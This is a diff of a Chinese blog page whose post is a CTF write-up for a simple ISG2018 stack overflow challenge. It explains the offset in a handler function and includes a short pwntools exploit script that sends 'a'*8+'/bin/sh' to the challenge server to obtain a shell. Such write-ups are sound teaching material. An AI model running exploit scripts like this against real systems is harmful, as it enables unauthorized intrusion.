@@ -6,20 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>怪咖的小屋</title>
+  <title>简单栈溢出 | 怪咖的小屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="简单栈溢出ISG2018 可能是最简单的一道栈溢出的题目…（但愚蠢的我没有注意到那个handler函数….）溢出点不在他让你overflow的地方，在handler函数里在这里v1没有限制输入，利用v1覆盖v2shell,直接得shell偏移量为 0x110 - 0x108 = 8那么构造payload为 ‘a’ * 8 +’/bin/sh’脚本如下： 1234567891011121314151">
+<meta name="keywords" content="pwn,栈,溢出">
 <meta property="og:type" content="article">
-<meta property="og:title" content="怪咖的小屋">
+<meta property="og:title" content="简单栈溢出">
 <meta property="og:url" content="http://yoursite.com/2019/09/10/简单栈溢出/index.html">
 <meta property="og:site_name" content="怪咖的小屋">
 <meta property="og:description" content="简单栈溢出ISG2018 可能是最简单的一道栈溢出的题目…（但愚蠢的我没有注意到那个handler函数….）溢出点不在他让你overflow的地方，在handler函数里在这里v1没有限制输入，利用v1覆盖v2shell,直接得shell偏移量为 0x110 - 0x108 = 8那么构造payload为 ‘a’ * 8 +’/bin/sh’脚本如下： 1234567891011121314151">
 <meta property="og:locale" content="zh">
 <meta property="og:image" content="http://yoursite.com/2019/09/10/简单栈溢出/cf05965825972578816647552cdc2851.png">
 <meta property="og:image" content="http://yoursite.com/2019/09/10/简单栈溢出/78421ec1a7f37ffb413a989314d3463f.png">
-<meta property="og:updated_time" content="2019-09-10T09:25:45.446Z">
+<meta property="og:updated_time" content="2019-09-10T10:05:49.117Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="怪咖的小屋">
+<meta name="twitter:title" content="简单栈溢出">
 <meta name="twitter:description" content="简单栈溢出ISG2018 可能是最简单的一道栈溢出的题目…（但愚蠢的我没有注意到那个handler函数….）溢出点不在他让你overflow的地方，在handler函数里在这里v1没有限制输入，利用v1覆盖v2shell,直接得shell偏移量为 0x110 - 0x108 = 8那么构造payload为 ‘a’ * 8 +’/bin/sh’脚本如下： 1234567891011121314151">
 <meta name="twitter:image" content="http://yoursite.com/2019/09/10/简单栈溢出/cf05965825972578816647552cdc2851.png">
   
@@ -156,9 +157,24 @@
             <article id="post-简单栈溢出" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      简单栈溢出
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/简单栈溢出/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
+    
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="简单栈溢出"><a href="#简单栈溢出" class="headerlink" title="简单栈溢出"></a><strong>简单栈溢出</strong></h3><p>ISG2018 可能是最简单的一道栈溢出的题目…（但愚蠢的我没有注意到那个handler函数….）<br>溢出点不在他让你overflow的地方，在handler函数里<br><img src="/2019/09/10/简单栈溢出/cf05965825972578816647552cdc2851.png" alt><br>在这里v1没有限制输入，利用v1覆盖v2shell,直接得shell<br>偏移量为 0x110 - 0x108 = 8<br>那么构造payload为 ‘a’ * 8 +’/bin/sh’<br>脚本如下：</p>
+        <h3 id="简单栈溢出"><a href="#简单栈溢出" class="headerlink" title="简单栈溢出"></a>简单栈溢出</h3><p>ISG2018 可能是最简单的一道栈溢出的题目…（但愚蠢的我没有注意到那个handler函数….）<br>溢出点不在他让你overflow的地方，在handler函数里<br><img src="/2019/09/10/简单栈溢出/cf05965825972578816647552cdc2851.png" alt><br>在这里v1没有限制输入，利用v1覆盖v2shell,直接得shell<br>偏移量为 0x110 - 0x108 = 8<br>那么构造payload为 ‘a’ * 8 +’/bin/sh’<br>脚本如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    s  =  remote(<span class="string">'202.120.7.206'</span>,  <span class="number">60010</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">    s.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'Overflow me'</span>)</span><br><span class="line">    s.sendline(<span class="string">'b'</span>  *  <span class="number">50</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'[N]'</span>)</span><br><span class="line">    s.sendline(<span class="string">'a'</span>  *  <span class="number">8</span>  +  <span class="string">'/bin/sh'</span>)</span><br><span class="line">    s.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
 <p>运行结果如图<br><img src="/2019/09/10/简单栈溢出/78421ec1a7f37ffb413a989314d3463f.png" alt="1535687009338.png"></p>
@@ -196,6 +212,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn,栈,溢出</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -260,18 +287,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/09/10/Pwnable.tw.start/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/09/10/ROP之ret2dlresolve/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          (no title)
+          ROP之ret2dlresolve
         
       </div>
     </a>
   
   
-    <a href="/2019/09/10/Canary绕过(格式化字符串利用)/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title"></div>
+    <a href="/2019/09/10/格式化字符串漏洞利用/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">格式化字符串漏洞利用</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -395,6 +422,38 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">pwn,格式化字符串</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">pwn,栈,溢出</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">pwn,python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">pwn,ROP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">pwn,ROP,ret2dlresolve</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">re</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
